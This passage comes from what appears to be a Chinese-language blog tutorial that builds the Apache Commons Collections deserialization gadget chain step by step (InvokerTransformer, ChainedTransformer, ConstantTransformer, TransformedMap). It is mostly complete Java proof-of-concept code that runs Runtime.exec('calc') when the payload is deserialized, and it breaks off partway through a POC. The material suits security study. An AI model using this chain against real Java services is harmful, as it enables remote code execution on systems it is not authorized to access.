class="string">&quot;java.lang.Runtime&quot;</span>),<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//执行payload</span></span><br><span class="line">        invokerTransformer.transform(input);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731192120814.png" alt="image-20210731192120814"></p>
<p>让我们来模拟一下客户端和服务器之间序列化和反序列化的过程：</p>
<p><strong>POC</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMapExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        <span class="comment">//首先创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;tm.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(invokerTransformer);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 服务端反序列化读取，并执行payload</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;tm.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">inv</span> <span class="operator">=</span> (InvokerTransformer) objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造input - 这里我们需要一个Runtime Object， 用Runtime.getRuntime()的返回值可以得到</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">input</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>),<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//执行payload</span></span><br><span class="line">        inv.transform(input);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们运行一下，成功弹出了计算器！</p>
<p>但是，我们来分析一下，这样写出来的POC有什么限制：</p>
<blockquote>
<p>服务端的开发人员需要“帮助”我们做以下事情，才能触发漏洞：</p>
<ul>
<li>把反序列化后的Object强制转化为InvokerTransformer类型</li>
<li>构造Input - Runtime实例</li>
<li>执行InvokerTransformer中的transform方法，并将Runtime实例以方法参数传入。</li>
</ul>
</blockquote>
<p>可以说这样的POC基本无法用于现实中的Java应用里，毫无意义。</p>
<p>那么我们怎么改造呢？</p>
<h4 id="第二步：ChainedTransformer"><a href="#第二步：ChainedTransformer" class="headerlink" title="第二步：ChainedTransformer"></a>第二步：ChainedTransformer</h4><p>首先来解决<code>input</code>的问题，我们想要自己来写<code>input</code>，这样有更多的自主性。而<code>ChainedTransformer</code>类就满足我们的要求。正如其名，它有着把各个<code>transformer</code>串起来的功能。</p>
<p>在<code>ChainedTransformer</code>中，有这样一个method：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">           object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> object;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>它循环遍历了<code>iTransformers</code>中的每一个元素 - 每一次循环，它都会把<code>该元素.transform(object)</code>的结果（一个对象）赋值给<code>object</code>，并返回。</p>
<p>这意味着，下一个元素执行的<code>transform()</code>方法中的参数就是上一个元素执行<code>transform()</code>方法的返回值。</p>
<p>而在<code>ChainedTransformer</code>的构造函数中我们可以控制<code>iTransformers</code>变量（<code>Transformer[]</code>类型），因为<code>InvokerTransformer implements Transformer</code>，那么我们之前的<code>InvokerTransformer</code>也可放在<code>Transformer[]</code>中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以构想：让我们构造的<code>input</code>(Runtime实例)作为第一个遍历元素的返回值，再执行第二个元素的transform时，刚好就传入了input这个参数了。</p>
<p>但问题是，怎么让我们构造的<code>input</code>(Runtime实例)能被<code>Transformer</code>类或其子类的<code>transform()</code>方法中的返回呢？</p>
<h4 id="第三步：ConstantTransformer"><a href="#第三步：ConstantTransformer" class="headerlink" title="第三步：ConstantTransformer"></a>第三步：ConstantTransformer</h4><p>我们找到了<code>ConstantTransformer</code>类，它是实现<code>Transformer</code>类的，可以被放进<code>Transformer[]</code>数组。在类里，它有我们想要的<code>transform()</code>方法，且刚好就返回了<code>iConstant</code>，我们可以在构造函数中传入<code>Runtime.getRuntime()</code>这个Object。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;<span class="comment">//Constructor -》我们可以控制iconstant</span></span><br><span class="line">    <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;<span class="comment">//返回iconstant</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样我们的链就可以连起来了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMapExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//返回input(Runtime实例)，并将它作为下面的transform()的方法参数传入</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;tm.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(chainedTransformer);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;tm.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">inv</span> <span class="operator">=</span> (ChainedTransformer) objectInputStream.readObject();</span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        inv.transform(<span class="string">&quot;Leihehe&quot;</span>);<span class="comment">//这里任何值都可以,因为ConstantTransformer.transform(object)中的object中没有被用到</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>原本想要的计算器没有出现，出现了错误：编译器提示<code>Runtime</code>没有实现<code>Serializable</code>，所以不能被序列化和反序列化。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731202443280.png" alt="image-20210731202443280"></p>
<p>那我们就采用反射的方法来获取Runtime实例，让服务器在反序列化的时候生成Runtime实例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMapExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;tm.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(chainedTransformer);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;tm.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">inv</span> <span class="operator">=</span> (ChainedTransformer) objectInputStream.readObject();</span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        inv.transform(<span class="string">&quot;Leihehe&quot;</span>);<span class="comment">//这里任何值都可以</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算器！但这样漏洞可以触发的范围依然不大，仍需要开发者在服务端将object转换为<code>ChainedTransformer</code>类型，且执行<code>transform</code>方法，我们需要扩大漏洞触发范围。</p>
<h4 id="第四步：TransformedMap-put"><a href="#第四步：TransformedMap-put" class="headerlink" title="第四步：TransformedMap - put()"></a>第四步：TransformedMap - put()</h4><blockquote>
<p><code>Apache Commons Collections</code> 实现了一个 <code>TransformedMap</code> 类，该类是对 Java 标准数据结构 <code>Map</code> 接口的一个扩展 。</p>
</blockquote>
<p>在<code>TransformedMap</code>类中，我们可以发现以下methods</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">protected</span> Object <span class="title function_">transformKey</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">this</span>.keyTransformer == <span class="literal">null</span> ? object : <span class="built_in">this</span>.keyTransformer.transform(object);</span><br><span class="line">       <span class="comment">//若keyTransformer不为null，则执行其transform方法</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">protected</span> Object <span class="title function_">transformValue</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer == <span class="literal">null</span> ? object : <span class="built_in">this</span>.valueTransformer.transform(object);</span><br><span class="line">       <span class="comment">//若valueTransformer不为null，则执行其transform方法</span></span><br><span class="line">   &#125;    </span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer.transform(value);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>这三个methods都会调用到对象的<code>transform</code>()方法，但都是<code>protected</code>属性，无法被外界访问，那么我们怎么触发到这三个方法呢？</p>
<p>继续在该Class中查看，发现了<code>put()</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;<span class="comment">//如果使用了put方法，那么就会执行transform方法</span></span><br><span class="line">    key = <span class="built_in">this</span>.transformKey(key);<span class="comment">//这里调用了我们想要调用的方法</span></span><br><span class="line">    value = <span class="built_in">this</span>.transformValue(value);<span class="comment">//这里调用了我们想要调用的方法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.getMap().put(key, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那<code>keyTransformer</code>和<code>valueTransformer</code>可控吗？</p>
<p><code>TransformedMap</code>类中的constructor传入两个转换链，一个是<code>keyTransformer</code>一个是<code>valueTransformer</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而它的<code>decorate()</code>静态方法会返回新的<code>TransformedMap</code>实例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么我们可以利用<code>TransformedMap.decorate()</code>来获取到一个新的<code>TransformedMap Instance</code></p>
<p><strong>POC：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMapExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">myMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);<span class="comment">//final malicious map</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;tm.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(myMap);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;tm.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapObj</span> <span class="operator">=</span> (Map) objectInputStream.readObject();</span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        mapObj.put(<span class="string">&quot;aa&quot;</span>,<span class="string">&quot;bb&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>计算器成功弹出！</p>
<p>现在范围扩大了，因为我们用到了更为常见的Map和<code>put()</code>触发。</p>
<p>我们更理想化的攻击方式是，服务器端只要反序列化<code>readObject()</code>就能触发反序列化漏洞。可惜的是，安全研究的前辈们发现并未有【重写了<code>readObject()</code>方法且方法内可以调用<code>MapObj.put()</code>方法】的Class。</p>
<h4 id="第五步：TransformedMap-checkSetValue"><a href="#第五步：TransformedMap-checkSetValue" class="headerlink" title="第五步：TransformedMap - checkSetValue()"></a>第五步：TransformedMap - checkSetValue()</h4><p>还记得第四步的时候，我们在<code>TransformedMap</code>类中还发现了一个方法，但<strong>并未利用</strong>吗？</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>既然<code>put()</code>不可以再进一步利用了，这个方法会不会有更多利用空间呢？<code>TransformedMap</code>类继承了<code>AbstractInputCheckedMapDecorator</code>类，我们跟进去看一下。搜索<code>checkSetValue()</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731222403673.png" alt="image-20210731222403673"></p>
<p>这里<code>MapEntry</code>里出现了<code>checkSetValue()</code>，那我们只要保证<code>this.parent</code>是指向<code>TransformedMap</code>类的对象就可以了。</p>
<p>我们看看<code>this.parent</code>都在哪些地方可以被赋值呢？</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731222703200.png" alt="image-20210731222703200"></p>
<p>分别是在<code>EntrySetIterator</code>和<code>EntrySet</code>的<code>constructor</code>里可以被赋值！但这是<strong>不同</strong>Class的<code>parent</code>，我们需要的是<code>MapEntry</code>里的<code>parent</code>，继续查看代码，发现：<code>EntrySetIterator</code>中的next()方法会将自身的<code>parent</code>传入<code>MapEntry</code>，而<code>EntrySet</code>的<code>iterator</code>方法又会创建一个新的<code>EntrySetIterator</code>，将它的parent传入<code>EntrySetIterator</code>，这样就连起来了 - <code>new EntrySet(set,parent).iterator().next()</code>就能够传入我们的parent。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731223154142.png" alt="image-20210731223154142"></p>
<p>接着我们发现，<code>AbstractInputCheckedMapDecorator</code>里还有一个<code>entrySet()</code>，因为我们的<code>TransformedMap</code>就是它的子类，所以我们可以直接用我们的<code>TransformedMap</code>去call这个method,一切就连起来了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Set <span class="title function_">entrySet</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (Set)(<span class="built_in">this</span>.isSetValueChecking() ? <span class="keyword">new</span> <span class="title class_">AbstractInputCheckedMapDecorator</span>.EntrySet(<span class="built_in">super</span>.map.entrySet(), <span class="built_in">this</span>) : <span class="built_in">super</span>.map.entrySet());<span class="comment">//这里会创建一个新的entrySet，把自身作为parent传入constructor</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>POC：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMapExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        